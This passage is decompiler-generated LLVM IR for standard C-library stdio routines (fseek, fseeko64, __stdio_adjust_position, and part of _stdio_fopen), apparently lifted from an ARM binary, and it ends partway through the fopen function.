define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1a038 = load i32, i32* @r2, align 4
  store i32 %v0_1a038, i32* @r3, align 4
  %v0_1a040 = call i32 @__GI_fseeko64()
  ret i32 %v0_1a040
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1a044 = load i32, i32* @r4, align 4
  %v6_1a044 = load i32, i32* @r5, align 4
  %v9_1a044 = load i32, i32* @r6, align 4
  %v0_1a048 = load i32, i32* @r3, align 4
  %v2_1a04c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_1a048, i32* @r6, align 4
  %v0_1a054 = load i32, i32* @r0, align 4
  store i32 %v0_1a054, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1a048, 3
  br i1 %tmp, label %dec_label_pc_1a070, label %dec_label_pc_1a05c

dec_label_pc_1a05c:                               ; preds = %entry
  %v0_1a05c = call i32 @__errno_location()
  store i32 %v0_1a05c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_1a068 = inttoptr i32 %v0_1a05c to i32*
  store i32 22, i32* %v2_1a068, align 4
  br label %.thread3

dec_label_pc_1a070:                               ; preds = %entry
  %v1_1a070 = add i32 %v0_1a054, 52
  %v2_1a070 = inttoptr i32 %v1_1a070 to i32*
  %v3_1a070 = load i32, i32* %v2_1a070, align 4
  store i32 %v3_1a070, i32* %r7.global-to-local, align 4
  %v2_1a074 = icmp eq i32 %v3_1a070, 0
  %v0_1a078 = load i32, i32* @r1, align 4
  store i32 %v0_1a078, i32* %stack_var_-28, align 4
  br i1 %v2_1a074, label %dec_label_pc_1a084, label %dec_label_pc_1a0b0

dec_label_pc_1a084:                               ; preds = %dec_label_pc_1a070
  %v1_1a084 = add i32 %v0_1a054, 56
  store i32 %v1_1a084, i32* @r4, align 4
  store i32 95968, i32* %r3.global-to-local, align 4
  store i32 %v2_1a04c, i32* @r0, align 4
  store i32 %v1_1a084, i32* %r2.global-to-local, align 4
  %v1_1a09c = call i32 @__pthread_return_void()
  %v0_1a0a0 = load i32, i32* @r4, align 4
  store i32 %v0_1a0a0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r3.global-to-local, align 4
  store i32 106672, i32* @lr, align 4
  %v1_1a0ac = call i32 @__pthread_return_0()
  store i32 %v1_1a0ac, i32* %r0.global-to-local, align 4
  %v0_1a0b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a0b0

dec_label_pc_1a0b0:                               ; preds = %dec_label_pc_1a070, %dec_label_pc_1a084
  %v0_1a0bc = phi i32 [ %v0_1a054, %dec_label_pc_1a070 ], [ %v0_1a0b0.pre, %dec_label_pc_1a084 ]
  %v1_1a0b0 = inttoptr i32 %v0_1a0bc to i8*
  %v2_1a0b0 = load i8, i8* %v1_1a0b0, align 1
  %v3_1a0b0 = zext i8 %v2_1a0b0 to i32
  store i32 %v3_1a0b0, i32* %r3.global-to-local, align 4
  %v1_1a0b4 = and i32 %v3_1a0b0, 64
  %v2_1a0b4 = icmp eq i32 %v1_1a0b4, 0
  br i1 %v2_1a0b4, label %dec_label_pc_1a0cc, label %dec_label_pc_1a0bc

dec_label_pc_1a0bc:                               ; preds = %dec_label_pc_1a0b0
  store i32 %v0_1a0bc, i32* @r0, align 4
  %v0_1a0c0 = call i32 @__stdio_wcommit()
  store i32 %v0_1a0c0, i32* %r0.global-to-local, align 4
  %v2_1a0c4 = icmp eq i32 %v0_1a0c0, 0
  br i1 %v2_1a0c4, label %dec_label_pc_1a0cc, label %dec_label_pc_1a13c

dec_label_pc_1a0cc:                               ; preds = %dec_label_pc_1a0bc, %dec_label_pc_1a0b0
  %v0_1a0cc = load i32, i32* @r6, align 4
  %v7_1a0cc = icmp eq i32 %v0_1a0cc, 1
  br i1 %v7_1a0cc, label %dec_label_pc_1a0d4, label %dec_label_pc_1a0cc.dec_label_pc_1a0e8_crit_edge

dec_label_pc_1a0cc.dec_label_pc_1a0e8_crit_edge:  ; preds = %dec_label_pc_1a0cc
  br label %dec_label_pc_1a0e8

dec_label_pc_1a0d4:                               ; preds = %dec_label_pc_1a0cc
  %v0_1a0d4 = load i32, i32* @r5, align 4
  store i32 %v0_1a0d4, i32* %r0.global-to-local, align 4
  %v2_1a0d8 = ptrtoint i32* %stack_var_-28 to i32
  %v2_1a0dc = inttoptr i32 %v0_1a0d4 to i8*
  %v3_1a0dc = call i32 @__stdio_adjust_position(i8* %v2_1a0dc, i32 %v2_1a0d8)
  store i32 %v3_1a0dc, i32* %r0.global-to-local, align 4
  %v1_1a0e0 = icmp slt i32 %v3_1a0dc, 0
  br i1 %v1_1a0e0, label %dec_label_pc_1a13c, label %dec_label_pc_1a0d4.dec_label_pc_1a0e8_crit_edge

dec_label_pc_1a0d4.dec_label_pc_1a0e8_crit_edge:  ; preds = %dec_label_pc_1a0d4
  %v0_1a0e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1a0e8

dec_label_pc_1a0e8:                               ; preds = %dec_label_pc_1a0cc.dec_label_pc_1a0e8_crit_edge, %dec_label_pc_1a0d4.dec_label_pc_1a0e8_crit_edge
  %v0_1a0e8 = phi i32 [ %v0_1a0cc, %dec_label_pc_1a0cc.dec_label_pc_1a0e8_crit_edge ], [ %v0_1a0e8.pre, %dec_label_pc_1a0d4.dec_label_pc_1a0e8_crit_edge ]
  store i32 %v0_1a0e8, i32* %r2.global-to-local, align 4
  %v0_1a0ec = load i32, i32* @r5, align 4
  store i32 %v0_1a0ec, i32* %r0.global-to-local, align 4
  %v4_1a0f4 = call i32 @__stdio_seek(i32 %v0_1a0ec, i32* nonnull %stack_var_-28, i32 %v0_1a0e8)
  store i32 %v4_1a0f4, i32* %r0.global-to-local, align 4
  %v1_1a0f8 = icmp slt i32 %v4_1a0f4, 0
  br i1 %v1_1a0f8, label %dec_label_pc_1a13c, label %dec_label_pc_1a100

dec_label_pc_1a100:                               ; preds = %dec_label_pc_1a0e8
  %v0_1a100 = load i32, i32* @r5, align 4
  %v1_1a100 = inttoptr i32 %v0_1a100 to i32*
  %v2_1a100 = load i32, i32* %v1_1a100, align 4
  store i32 %v2_1a100, i32* %r3.global-to-local, align 4
  %v1_1a104 = add i32 %v0_1a100, 8
  %v2_1a104 = inttoptr i32 %v1_1a104 to i32*
  %v3_1a104 = load i32, i32* %v2_1a104, align 4
  store i32 %v3_1a104, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1a10c = and i32 %v2_1a100, -72
  store i32 %v1_1a10c, i32* %r3.global-to-local, align 4
  %v3_1a110 = sdiv i32 %v2_1a100, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1a118 = trunc i32 %v3_1a110 to i8
  %v3_1a118 = add i32 %v0_1a100, 1
  %v4_1a118 = inttoptr i32 %v3_1a118 to i8*
  store i8 %v1_1a118, i8* %v4_1a118, align 1
  %v0_1a11c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a11c = load i32, i32* @r5, align 4
  %v2_1a11c = add i32 %v1_1a11c, 28
  %v3_1a11c = inttoptr i32 %v2_1a11c to i32*
  store i32 %v0_1a11c, i32* %v3_1a11c, align 4
  %v0_1a120 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a120 = trunc i32 %v0_1a120 to i8
  %v2_1a120 = load i32, i32* @r5, align 4
  %v3_1a120 = add i32 %v2_1a120, 2
  %v4_1a120 = inttoptr i32 %v3_1a120 to i8*
  store i8 %v1_1a120, i8* %v4_1a120, align 1
  %v0_1a124 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a124 = trunc i32 %v0_1a124 to i8
  %v2_1a124 = load i32, i32* @r5, align 4
  %v3_1a124 = inttoptr i32 %v2_1a124 to i8*
  store i8 %v1_1a124, i8* %v3_1a124, align 1
  %v0_1a128 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a128 = load i32, i32* @r5, align 4
  %v2_1a128 = add i32 %v1_1a128, 16
  %v3_1a128 = inttoptr i32 %v2_1a128 to i32*
  store i32 %v0_1a128, i32* %v3_1a128, align 4
  %v0_1a12c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a12c = load i32, i32* @r5, align 4
  %v2_1a12c = add i32 %v1_1a12c, 20
  %v3_1a12c = inttoptr i32 %v2_1a12c to i32*
  store i32 %v0_1a12c, i32* %v3_1a12c, align 4
  %v0_1a130 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a130 = load i32, i32* @r5, align 4
  %v2_1a130 = add i32 %v1_1a130, 24
  %v3_1a130 = inttoptr i32 %v2_1a130 to i32*
  store i32 %v0_1a130, i32* %v3_1a130, align 4
  %v0_1a134 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a134 = load i32, i32* @r5, align 4
  %v2_1a134 = add i32 %v1_1a134, 44
  %v3_1a134 = inttoptr i32 %v2_1a134 to i32*
  store i32 %v0_1a134, i32* %v3_1a134, align 4
  br label %dec_label_pc_1a140

dec_label_pc_1a13c:                               ; preds = %dec_label_pc_1a0bc, %dec_label_pc_1a0e8, %dec_label_pc_1a0d4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a140

dec_label_pc_1a140:                               ; preds = %dec_label_pc_1a100, %dec_label_pc_1a13c
  %v0_1a140 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a140 = icmp eq i32 %v0_1a140, 0
  br i1 %v2_1a140, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1a140
  store i32 %v2_1a04c, i32* %r0.global-to-local, align 4
  store i32 95968, i32* %r3.global-to-local, align 4
  store i32 106840, i32* @lr, align 4
  call void @__pseudo_branch(i32 95968)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1a140, %dec_label_pc_1a05c, %bb
  %v0_1a158 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a158, i32* %r0.global-to-local, align 4
  store i32 %v3_1a044, i32* @r4, align 4
  store i32 %v6_1a044, i32* @r5, align 4
  store i32 %v9_1a044, i32* @r6, align 4
  ret i32 %v0_1a158

; uselistorder directives
  uselistorder i32 %v0_1a0e8, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a140, { 1, 0 }
  uselistorder label %dec_label_pc_1a13c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1a0e8, { 1, 0 }
  uselistorder label %dec_label_pc_1a0b0, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1a174 = load i32, i32* @r4, align 4
  store i32 %v3_1a174, i32* %stack_var_-16, align 4
  %v2_1a178 = add i32 %tmp, 1
  %v3_1a178 = inttoptr i32 %v2_1a178 to i8*
  %v4_1a178 = load i8, i8* %v3_1a178, align 1
  %v5_1a178 = zext i8 %v4_1a178 to i32
  %v3_1a17c = load i8, i8* %arg1, align 1
  %v4_1a17c = zext i8 %v3_1a17c to i32
  store i32 %v4_1a17c, i32* %r2.global-to-local, align 4
  %v4_1a180 = mul nuw nsw i32 %v5_1a178, 256
  %v5_1a180 = or i32 %v4_1a17c, %v4_1a180
  store i32 %v5_1a180, i32* @lr, align 4
  %tmp15 = urem i8 %v3_1a17c, 4
  %v2_1a184 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_1a184, label %bb, label %dec_label_pc_1a194

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_1a194:                               ; preds = %entry
  %v1_1a184 = zext i8 %tmp15 to i32
  %v1_1a194 = add nsw i32 %v1_1a184, -1
  %v7_1a194 = icmp eq i8 %tmp15, 1
  br i1 %v7_1a194, label %.thread, label %dec_label_pc_1a19c

dec_label_pc_1a19c:                               ; preds = %dec_label_pc_1a194
  %v1_1a19c = and i32 %v4_1a180, 2048
  %v2_1a19c = icmp eq i32 %v1_1a19c, 0
  br i1 %v2_1a19c, label %.thread, label %dec_label_pc_1a1a4

dec_label_pc_1a1a4:                               ; preds = %dec_label_pc_1a19c
  %v8_1a1a8 = icmp sgt i32 %v1_1a194, 1
  br i1 %v8_1a1a8, label %dec_label_pc_1a234, label %dec_label_pc_1a1ac

dec_label_pc_1a1ac:                               ; preds = %dec_label_pc_1a1a4
  %v2_1a1ac = add i32 %tmp, 40
  %v3_1a1ac = inttoptr i32 %v2_1a1ac to i32*
  %v4_1a1ac = load i32, i32* %v3_1a1ac, align 4
  %v2_1a1b0 = icmp eq i32 %v4_1a1ac, 0
  br i1 %v2_1a1b0, label %dec_label_pc_1a1b8, label %dec_label_pc_1a234

dec_label_pc_1a1b8:                               ; preds = %dec_label_pc_1a1ac
  %v2_1a1b8 = add i32 %tmp, 3
  %v3_1a1b8 = inttoptr i32 %v2_1a1b8 to i8*
  %v4_1a1b8 = load i8, i8* %v3_1a1b8, align 1
  %v5_1a1b8 = zext i8 %v4_1a1b8 to i32
  %v2_1a1bc = add i32 %tmp, 44
  %v3_1a1bc = inttoptr i32 %v2_1a1bc to i32*
  %v4_1a1bc = load i32, i32* %v3_1a1bc, align 4
  store i32 %v4_1a1bc, i32* %r2.global-to-local, align 4
  %v2_1a1c0 = sub nsw i32 %v1_1a194, %v5_1a1b8
  %v1_1a1c8 = add nsw i32 %v2_1a1c0, -1
  %tmp11 = icmp slt i32 %v4_1a1bc, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_1a1b8
  %v7_1a1cc = add i32 %tmp, 2
  %v8_1a1cc = inttoptr i32 %v7_1a1cc to i8*
  %v9_1a1cc = load i8, i8* %v8_1a1cc, align 1
  %v10_1a1cc = zext i8 %v9_1a1cc to i32
  %v7_1a1d0 = sub nsw i32 %v1_1a1c8, %v10_1a1cc
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a1b8, %bb, %dec_label_pc_1a19c, %dec_label_pc_1a194, %bb12
  %v0_1a1ec = phi i32 [ %v1_1a194, %dec_label_pc_1a19c ], [ %v1_1a194, %dec_label_pc_1a194 ], [ 0, %bb ], [ %v7_1a1d0, %bb12 ], [ %v1_1a1c8, %dec_label_pc_1a1b8 ]
  %v1_1a1d4 = and i32 %v4_1a17c, 64
  %v2_1a1d4 = icmp eq i32 %v1_1a1d4, 0
  %storemerge.in.in.v = select i1 %v2_1a1d4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1a1e0 = add i32 %tmp, 16
  %v3_1a1e0 = inttoptr i32 %v2_1a1e0 to i32*
  %v4_1a1e0 = load i32, i32* %v3_1a1e0, align 4
  %v2_1a1e4 = sub i32 %storemerge, %v4_1a1e0
  %v1_1a1e8 = inttoptr i32 %arg2 to i32*
  %v2_1a1e8 = load i32, i32* %v1_1a1e8, align 4
  store i32 %v2_1a1e8, i32* %r1.global-to-local, align 4
  %v3_1a1e8 = add i32 %arg2, 4
  %v4_1a1e8 = inttoptr i32 %v3_1a1e8 to i32*
  %v5_1a1e8 = load i32, i32* %v4_1a1e8, align 4
  store i32 %v5_1a1e8, i32* %r2.global-to-local, align 4
  %v2_1a1ec = add i32 %v2_1a1e4, %v0_1a1ec
  store i32 %v2_1a1ec, i32* %r5.global-to-local, align 4
  %v2_1a1f0 = sub i32 %v2_1a1e8, %v2_1a1ec
  %v2_1a1f4 = and i32 %v2_1a1ec, 1073741824
  %v3_1a1f4 = icmp ne i32 %v2_1a1f4, 0
  %v6_1a1f4 = icmp eq i1 %v3_1a1f4, false
  %tmp16 = icmp slt i32 %v2_1a1ec, 0
  %v4_1a1f4.neg = zext i1 %tmp16 to i32
  %v7_1a1f4 = add i32 %v5_1a1e8, %v4_1a1f4.neg
  %v9_1a1f4 = sext i1 %v6_1a1f4 to i32
  %v10_1a1f4 = add i32 %v7_1a1f4, %v9_1a1f4
  store i32 %v10_1a1f4, i32* %r4.global-to-local, align 4
  store i32 %v2_1a1f0, i32* %v1_1a1e8, align 4
  %v5_1a1f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a1f8, i32* %v4_1a1e8, align 4
  %v0_1a1fc = load i32, i32* %r6.global-to-local, align 4
  %v1_1a1fc = add i32 %v0_1a1fc, 4
  %v2_1a1fc = inttoptr i32 %v1_1a1fc to i32*
  %v3_1a1fc = load i32, i32* %v2_1a1fc, align 4
  %v1_1a200 = load i32, i32* %r2.global-to-local, align 4
  %v8_1a204 = icmp sgt i32 %v3_1a1fc, %v1_1a200
  br i1 %v8_1a204, label %dec_label_pc_1a218, label %dec_label_pc_1a208

dec_label_pc_1a208:                               ; preds = %.thread
  %v9_1a200 = icmp eq i32 %v3_1a1fc, %v1_1a200
  br i1 %v9_1a200, label %dec_label_pc_1a20c, label %dec_label_pc_1a21cthread-pre-split

dec_label_pc_1a20c:                               ; preds = %dec_label_pc_1a208
  %v1_1a20c = inttoptr i32 %v0_1a1fc to i32*
  %v2_1a20c = load i32, i32* %v1_1a20c, align 4
  %v1_1a210 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1a20c, %v1_1a210
  br i1 %tmp17, label %dec_label_pc_1a218, label %dec_label_pc_1a21cthread-pre-split

dec_label_pc_1a218:                               ; preds = %dec_label_pc_1a20c, %.thread
  %v0_1a218 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a218 = sub i32 0, %v0_1a218
  store i32 %v1_1a218, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a21c

dec_label_pc_1a21cthread-pre-split:               ; preds = %dec_label_pc_1a20c, %dec_label_pc_1a208
  %v0_1a21c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a21c

dec_label_pc_1a21c:                               ; preds = %dec_label_pc_1a21cthread-pre-split, %dec_label_pc_1a218
  %v0_1a21c = phi i32 [ %v0_1a21c.pr, %dec_label_pc_1a21cthread-pre-split ], [ %v1_1a218, %dec_label_pc_1a218 ]
  %v1_1a21c = icmp slt i32 %v0_1a21c, 0
  br i1 %v1_1a21c, label %dec_label_pc_1a224, label %dec_label_pc_1a238

dec_label_pc_1a224:                               ; preds = %dec_label_pc_1a21c
  %v0_1a224 = call i32 @__errno_location()
  %v2_1a22c = inttoptr i32 %v0_1a224 to i32*
  store i32 75, i32* %v2_1a22c, align 4
  %v0_1a238.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a238

dec_label_pc_1a234:                               ; preds = %dec_label_pc_1a1ac, %dec_label_pc_1a1a4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a238

dec_label_pc_1a238:                               ; preds = %dec_label_pc_1a21c, %dec_label_pc_1a224, %dec_label_pc_1a234
  %v0_1a238 = phi i32 [ %v0_1a21c, %dec_label_pc_1a21c ], [ %v0_1a238.pre, %dec_label_pc_1a224 ], [ -1, %dec_label_pc_1a234 ]
  %v2_1a23c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a23c, i32* @r4, align 4
  ret i32 %v0_1a238

; uselistorder directives
  uselistorder i32 %v1_1a200, { 1, 0 }
  uselistorder i32 %v3_1a1fc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_1a17c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a238, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1a240 = load i32, i32* @r4, align 4
  store i32 %v3_1a240, i32* %stack_var_-24, align 4
  %v6_1a240 = load i32, i32* @r5, align 4
  %v9_1a240 = load i32, i32* @r6, align 4
  %v15_1a240 = load i32, i32* @r8, align 4
  %v0_1a244 = load i32, i32* @r1, align 4
  %v1_1a244 = inttoptr i32 %v0_1a244 to i8*
  %v2_1a244 = load i8, i8* %v1_1a244, align 1
  %v3_1a244 = zext i8 %v2_1a244 to i32
  store i32 %v3_1a244, i32* @ip, align 4
  %v7_1a248 = icmp eq i8 %v2_1a244, 114
  store i1 %v7_1a248, i1* %cpsr_z.global-to-local, align 1
  %v2_1a24c = ptrtoint i32* %stack_var_-56 to i32
  %v0_1a250 = load i32, i32* @r0, align 4
  store i32 %v0_1a250, i32* @r6, align 4
  %v0_1a254 = load i32, i32* @r2, align 4
  store i32 %v0_1a254, i32* @r8, align 4
  %v0_1a258 = load i32, i32* @r3, align 4
  store i32 %v0_1a258, i32* @r5, align 4
  br i1 %v7_1a248, label %dec_label_pc_1a2a4, label %dec_label_pc_1a260

dec_label_pc_1a260:                               ; preds = %entry
  %v7_1a260 = icmp eq i8 %v2_1a244, 119
  store i1 %v7_1a260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a260, label %bb, label %dec_label_pc_1a26c

bb:                                               ; preds = %dec_label_pc_1a260
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1a2a8

dec_label_pc_1a26c:                               ; preds = %dec_label_pc_1a260
  %v7_1a26c = icmp eq i8 %v2_1a244, 97
  store i1 %v7_1a26c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a26c, label %bb30, label %dec_label_pc_1a278

bb30:                                             ; preds = %dec_label_pc_1a26c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1a2a8

dec_label_pc_1a278:                               ; preds = %dec_label_pc_1a26c, %dec_label_pc_1a330, %dec_label_pc_1a304
  %v0_1a278 = call i32 @__errno_location()
  store i32 %v0_1a278, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_1a280 = load i32, i32* @r8, align 4
  %v2_1a280 = icmp eq i32 %v0_1a280, 0
  store i1 %v2_1a280, i1* %cpsr_z.global-to-local, align 1
  %v2_1a284 = inttoptr i32 %v0_1a278 to i32*
  store i32 22, i32* %v2_1a284, align 4
  br i1 %v2_1a280, label %dec_label_pc_1a4f8, label %dec_label_pc_1a28c

dec_label_pc_1a28c:                               ; preds = %dec_label_pc_1a354._crit_edge, %dec_label_pc_1a278
  %v0_1a28c = load i32, i32* @r8, align 4
  %v1_1a28c = add i32 %v0_1a28c, 1
  %v2_1a28c = inttoptr i32 %v1_1a28c to i8*
  %v3_1a28c = load i8, i8* %v2_1a28c, align 1
  %v4_1a28c = zext i8 %v3_1a28c to i32
  store i32 %v4_1a28c, i32* %r3.global-to-local, align 4
  %v1_1a290 = and i32 %v4_1a28c, 32
  %v2_1a290 = icmp eq i32 %v1_1a290, 0
  store i1 %v2_1a290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a290, label %dec_label_pc_1a4f8, label %dec_label_pc_1a298

dec_label_pc_1a298:                               ; preds = %dec_label_pc_1a28c
  store i32 %v0_1a28c, i32* %r0.global-to-local, align 4
  %v2_1a29c = call i32 @free(i32 %v0_1a28c)
  store i32 %v2_1a29c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a4f8

dec_label_pc_1a2a4:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1a2a8

dec_label_pc_1a2a8:                               ; preds = %bb, %bb30, %dec_label_pc_1a2a4
  %v1_1a2c0 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_1a2a4 ]
  %v1_1a2a8 = add i32 %v0_1a244, 1
  %v2_1a2a8 = inttoptr i32 %v1_1a2a8 to i8*
  %v3_1a2a8 = load i8, i8* %v2_1a2a8, align 1
  %v7_1a2ac = icmp eq i8 %v3_1a2a8, 98
  store i1 %v7_1a2ac, i1* %cpsr_z.global-to-local, align 1
  %v1_1a2a8.v0_1a244 = select i1 %v7_1a2ac, i32 %v1_1a2a8, i32 %v0_1a244
  store i32 %v1_1a2a8.v0_1a244, i32* %r3.global-to-local, align 4
  %v1_1a2b8 = add i32 %v1_1a2a8.v0_1a244, 1
  %v2_1a2b8 = inttoptr i32 %v1_1a2b8 to i8*
  %v3_1a2b8 = load i8, i8* %v2_1a2b8, align 1
  %v4_1a2b8 = zext i8 %v3_1a2b8 to i32
  store i32 %v4_1a2b8, i32* %r3.global-to-local, align 4
  %v7_1a2bc = icmp eq i8 %v3_1a2b8, 43
  store i1 %v7_1a2bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2bc, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_1a2a8
  store i32 %v1_1a2c0, i32* %r3.global-to-local, align 4
  %v2_1a2c4 = add nuw nsw i32 %v1_1a2c0, 1
  store i32 %v2_1a2c4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1a2a8, %bb33
  %v2_1a2c8 = icmp eq i32 %v0_1a254, 0
  store i1 %v2_1a2c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2c8, label %dec_label_pc_1a2d0, label %dec_label_pc_1a2fc

dec_label_pc_1a2d0:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_1a2d4 = call i32 @malloc(i32 80)
  store i32 %v1_1a2d4, i32* %r0.global-to-local, align 4
  store i32 %v1_1a2d4, i32* @r8, align 4
  %v3_1a2d8 = icmp eq i32 %v1_1a2d4, 0
  store i1 %v3_1a2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a2d8, label %dec_label_pc_1a4fc, label %dec_label_pc_1a2e0

dec_label_pc_1a2e0:                               ; preds = %dec_label_pc_1a2d0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_1a2e8 = add i32 %v1_1a2d4, 1
  %v4_1a2e8 = inttoptr i32 %v3_1a2e8 to i8*
  store i8 32, i8* %v4_1a2e8, align 1
  %v0_1a2ec = load i32, i32* %r2.global-to-local, align 4
  %v1_1a2ec = load i32, i32* @r8, align 4
  %v2_1a2ec = add i32 %v1_1a2ec, 8
  %v3_1a2ec = inttoptr i32 %v2_1a2ec to i32*
  store i32 %v0_1a2ec, i32* %v3_1a2ec, align 4
  %v0_1a2f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a2f0 = trunc i32 %v0_1a2f0 to i8
  %v2_1a2f0 = load i32, i32* @r8, align 4
  %v3_1a2f0 = inttoptr i32 %v2_1a2f0 to i8*
  store i8 %v1_1a2f0, i8* %v3_1a2f0, align 1
  %v0_1a2f4 = load i32, i32* @r8, align 4
  %v1_1a2f4 = add i32 %v0_1a2f4, 56
  store i32 %v1_1a2f4, i32* @r0, align 4
  %v0_1a2f8 = call i32 @__stdio_init_mutex()
  store i32 %v0_1a2f8, i32* %r0.global-to-local, align 4
  %v0_1a2fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a2fc

dec_label_pc_1a2fc:                               ; preds = %.thread4, %dec_label_pc_1a2e0
  %v0_1a354 = phi i32 [ %v0_1a258, %.thread4 ], [ %v0_1a2fc.pre, %dec_label_pc_1a2e0 ]
  %v1_1a2fc = icmp slt i32 %v0_1a354, 0
  %v2_1a2fc = icmp eq i32 %v0_1a354, 0
  store i1 %v2_1a2fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1a2fc, label %dec_label_pc_1a354, label %dec_label_pc_1a304

dec_label_pc_1a304:                               ; preds = %dec_label_pc_1a2fc
  %v0_1a308 = load i32, i32* @r4, align 4
  %v2_1a308 = and i32 %v0_1a308, ptrtoint ([4 x i8]* @global_var_20003.1631 to i32)
  %v1_1a30c = add i32 %v2_1a308, 1
  store i32 %v1_1a30c, i32* %r2.global-to-local, align 4
  %v0_1a310 = load i32, i32* @r6, align 4
  %v1_1a310 = add i32 %v0_1a310, 1
  %v2_1a314 = and i32 %v1_1a310, %v1_1a30c
  store i32 %v2_1a314, i32* %r3.global-to-local, align 4
  %v9_1a318 = icmp eq i32 %v2_1a314, %v1_1a30c
  store i1 %v9_1a318, i1* %cpsr_z.global-to-local, align 1
  %v1_1a31c = load i32, i32* @r8, align 4
